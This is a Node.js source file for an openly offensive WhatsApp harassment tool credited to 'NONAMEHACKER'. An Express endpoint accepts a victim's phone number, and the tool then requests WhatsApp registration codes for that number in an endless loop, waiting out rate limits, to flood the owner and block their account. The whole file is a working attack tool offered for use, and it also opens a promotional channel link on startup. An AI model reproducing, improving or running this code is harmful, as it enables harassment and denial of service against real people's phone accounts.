const express = require('express');
const cors = require('cors');
const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs');
const { exec } = require('child_process');
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

// Initialize Express
const app = express();
app.use(cors());
app.use(express.json());

// Setup
if (!fs.existsSync('./files')) fs.mkdirSync('./files');
if (!fs.existsSync('./files/numbers.json')) fs.writeFileSync('./files/numbers.json', JSON.stringify({}));

const color = (text, colors) => {
    try { return gradient(colors)(text); } catch (e) { return text; }
};

// --- MASTER Banner ---
const masterBanner = `
${color(' ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ ', ['#FF0000', '#800000'])}
${color(' ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗', ['#FF0000', '#800000'])}
${color(' ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝', ['#FF0000', '#800000'])}
${color(' ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔════╝██╔══██╗', ['#FF0000', '#800000'])}
${color(' ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║', ['#FF0000', '#800000'])}
${color(' ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝', ['#FF0000', '#800000'])}
`;

const spiderArt = `
    ${color('          _xxxx_          ', ['#FF0000', '#200000'])}
    ${color('        /        \\        ', ['#FF0000', '#200000'])}
    ${color('      /            \\      ', ['#FF0000', '#200000'])}
    ${color('     |   _      _   |     ', ['#FF0000', '#FFFFFF'])}
    ${color('     |  (o)    (o)  |     ', ['#FF0000', '#FFFFFF'])}
    ${color('     |      __      |     ', ['#FF0000', '#200000'])}
    ${color('      \\    \\__/    /      ', ['#FF0000', '#200000'])}
    ${color('        \\________/        ', ['#FF0000', '#200000'])}
    ${color('      _ /        \\ _      ', ['#FF0000', '#200000'])}
    ${color('     /              \\     ', ['#FF0000', '#200000'])}
`;

let spam; // Global socket reference

const startBackend = async () => {
    console.clear(); 

    const mainChannel = 'https://whatsapp.com/channel/0029Va75f6BIXnlq8eZxTy2M';
    const openCmd = process.platform === 'win32' ? `start ${mainChannel}` : `termux-open-url ${mainChannel} || xdg-open ${mainChannel}`;
    exec(openCmd);

    console.log(masterBanner);
    console.log(spiderArt);
    console.log(color('╔════════════════════════════════════════════╗', ['#FF0000', '#4B0082']));
    console.log(color('║       👑 OWNER: NONAMEHACKER 👑            ║', ['#FFFFFF', '#FF0000']));
    console.log(color('║       🛡️ TEAM : Ｍ▲ＳＴΞЯ...               ║', ['#00FFFF', '#0000FF']));
    console.log(color('╚════════════════════════════════════════════╝', ['#FF0000', '#4B0082']));

    const { state } = await useMultiFileAuthState('.auth_session');

    spam = makeWaSocket({
        auth: state,
        mobile: true,
        logger: pino({ level: 'silent' })
    });
};

const dropNumber = async (context) => {
    const { ddi, number, phoneNumber } = context;
    while (true) {
        try {
            console.clear();
            console.log(masterBanner);
            console.log(spiderArt);
            console.log(color('───────────────────────────────────────', ['#FF0000', '#000000']));
            console.log(color(`  [+] SYSTEM STATUS : ACTIVE 🚀        `, ['#00FF00', '#FFFFFF']));
            console.log(color(`  [+] TARGET NUMBER : +${ddi}${number} `, ['#FF0000', '#FFFFFF']));
            console.log(color(`  [+] DEVELOPED BY  : NONAMEHACKER     `, ['#FFFF00', '#FFA500']));
            console.log(color('───────────────────────────────────────', ['#FF0000', '#000000']));

            const res = await spam.requestRegistrationCode({
                phoneNumber: '+' + phoneNumber,
                phoneNumberCountryCode: ddi,
                phoneNumberNationalNumber: number,
                phoneNumberMobileCountryCode: 724
            });

            if (res.reason === 'temporarily_unavailable') {
                console.log(color(`[!] LIMIT REACHED! WAITING: ${res.retry_after}s`, ['#FF4500', '#FF0000']));
                await new Promise(r => setTimeout(r, res.retry_after * 1000));
            }
        } catch (e) {
            // Background retry logic exactly as before
        }
    }
};

// API Route to receive data from index.html
app.post('/start', (req, res) => {
    const { ddi, number } = req.body;

    if (!ddi || !number) {
        return res.status(400).json({ error: "Missing Country Code or Phone Number" });
    }

    // Start the process asynchronously in the background
    dropNumber({ 
        ddi: ddi, 
        number: number, 
        phoneNumber: ddi + number 
    });

    console.log(`[+] Received web request to target: +${ddi}${number}`);
    res.json({ message: `Process successfully started for +${ddi}${number}` });
});

// Start server and Baileys session
app.listen(2569, async () => {
    console.log("Starting web server on port 2569...");
    await startBackend();
});
